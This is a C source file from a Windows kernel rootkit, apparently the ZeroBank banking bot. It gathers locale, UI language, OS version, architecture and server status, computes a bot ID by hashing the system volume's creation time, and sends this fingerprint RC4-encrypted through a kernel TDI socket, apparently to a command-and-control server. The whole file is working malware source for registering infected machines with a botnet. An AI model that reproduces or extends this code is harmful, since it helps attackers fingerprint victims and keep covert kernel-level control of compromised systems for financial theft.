#include "common.h"

char *querylocation(char *buffer, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	LCID cid = 0;

	st = Hash->_ZwQueryDefaultLocale(FALSE, &cid);
	if (NT_SUCCESS(st))
	{
		switch (cid)
		{
		case 2052:
			kistrcpy(buffer, "Chinese-Simplified");
			break;
		case 1028:
			kistrcpy(buffer, "Chinese-Traditional");
			break;
		case 1040:
			kistrcpy(buffer, "Italian");
			break;
		case 1036:
			kistrcpy(buffer, "French");
			break;
		case 1041:
			kistrcpy(buffer, "Japanese");
			break;
		case 1042:
			kistrcpy(buffer, "Korean");
			break;
		case 1033:
			kistrcpy(buffer, "English");
			break;
		case 3082:
			kistrcpy(buffer, "Spanish");
			break;

		default:
			break;
		}
	}

	return buffer;
}

char *querylanguage(char *buffer, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	LANGID id = 0;

	st = Hash->_ZwQueryDefaultUILanguage(&id);
	if (NT_SUCCESS(st))
	{
		switch (id)
		{
		case 1025:
			kistrcpy(buffer, "Arabic");
			break;
		case 1028:
			kistrcpy(buffer, "Chinese-Traditional");
			break;
		case 1029:
			kistrcpy(buffer, "Czech");
			break;
		case 1030:
			kistrcpy(buffer, "Danish");
			break;
		case 1031:
			kistrcpy(buffer, "German");
			break;
		case 1032:
			kistrcpy(buffer, "Greek");
			break;
		case 1033:
			kistrcpy(buffer, "English");
			break;
		case 1034:
			kistrcpy(buffer, "Spanish");
			break;
		case 1035:
			kistrcpy(buffer, "Finnish");
			break;
		case 1036:
			kistrcpy(buffer, "French");
			break;
		case 1037:
			kistrcpy(buffer, "Hebrew");
			break;
		case 1038:
			kistrcpy(buffer, "Hungarian");
			break;
		case 1040:
			kistrcpy(buffer, "Italian");
			break;
		case 1041:
			kistrcpy(buffer, "Japanese");
			break;
		case 1042:
			kistrcpy(buffer, "Korean");
			break;
		case 1043:
			kistrcpy(buffer, "Dutch");
			break;
		case 1044:
			kistrcpy(buffer, "Norwegian");
			break;
		case 1045:
			kistrcpy(buffer, "Polish");
			break;
		case 1046:
			kistrcpy(buffer, "Portuguese-Brazilian");
			break;
		case 1049:
			kistrcpy(buffer, "Russsian");
			break;
		case 1053:
			kistrcpy(buffer, "Swedish");
			break;
		case 1054:
			kistrcpy(buffer, "Thai");
			break;
		case 1055:
			kistrcpy(buffer, "Turkish");
			break;
		case 2052:
			kistrcpy(buffer, "Chinese-Simplified");
			break;
		case 2070:
			kistrcpy(buffer, "Portuguese");
			break;
		case 3076:
			kistrcpy(buffer, "Chinese-Hong Kong SAR");
			break;
		default:
			break;
		}
	}

	return buffer;
	
}


BOOLEAN zerobank_bot_header(IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash)
{
	ZEROBANK_BOT_HEADER rkbot = { 0 };
	ULONG mj, mn, build;
	FILE_FS_VOLUME_INFORMATION volinfo = { 0 };
	HANDLE volhandle;
	IO_STATUS_BLOCK io = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING ustr1 = RTL_CONSTANT_STRING(L"\\SystemRoot");
	NTSTATUS st;
	INT sendsize = 0;
	BOOLEAN ret;
	UUID guid = { 0 };
	MD5Context ctx = { 0 };
	rc4_ctx rc4ctx = { 0 };
	unsigned char md5_digest[16];
	unsigned long seed = 0;

	// get bot Windows version

	Hash->_PsGetVersion(&mj, &mn, &build, NULL);
	switch (mn)
	{
	case 1:
		kistrcpy(rkbot.Os, "Windows 7");
		break;
	case 2:
		kistrcpy(rkbot.Os, "Windows 8");
		break;
	case 3:
		kistrcpy(rkbot.Os, "Windows 8.1");
		break;
	case 0:
		kistrcpy(rkbot.Os, "Windows 10");
		break;
	default:
		break;
	}

#ifndef _WIN64
	kistrcpy(rkbot.Arch, "x86");
#else
	kistrcpy(rkbot.Arch, "x64");
#endif


	if (Hash->_MmIsThisAnNtAsSystem() == TRUE)
		rkbot.IsNtServer = TRUE;
	else
		rkbot.IsNtServer = FALSE;
	
	querylocation(rkbot.Locale, Hash);
	querylanguage(rkbot.lang, Hash);

	rkbot.Build = build;
	rkbot.majorver = mj;
	rkbot.minorver = mn;

	InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	st = Hash->_ZwOpenFile(&volhandle, FILE_GENERIC_READ, &oa, &io, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);
	if (NT_SUCCESS(st))
	{

		st = Hash->_ZwQueryVolumeInformationFile(volhandle, &io, &volinfo, sizeof(FILE_FS_VOLUME_INFORMATION), FileFsVolumeInformation);
		if (NT_SUCCESS(st))
		{

			seed = (volinfo.VolumeCreationTime.LowPart) ^ (volinfo.VolumeCreationTime.HighPart);
			
			__try
			{
				MD5Init(&ctx);
				MD5Update(&ctx, (const unsigned char*)&seed, sizeof(ULONG));
				MD5Final(md5_digest, &ctx);

				kimemcpy(&guid, md5_digest, 16);

				Hash->_sprintf_s(rkbot.BotId, 255, "%04x-%04x-%04x", guid.Data1, guid.Data2, guid.Data3);

				kistrcpy(g_idpath, rkbot.BotId);

			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{
				return GetExceptionCode();
			}

			sendsize = tdi_send_crypted(socket, RC4_KEY_1, (PZEROBANK_BOT_HEADER)&rkbot, sizeof(ZEROBANK_BOT_HEADER), 0);
			if (sendsize <= 0)
				ret = FALSE;
			else
				ret = TRUE;

		}
#ifndef _WIN64
		ObpCloseHandle(volhandle, KernelMode);
#else
		ZwClose(volhandle);
#endif
	}

	return ret;

}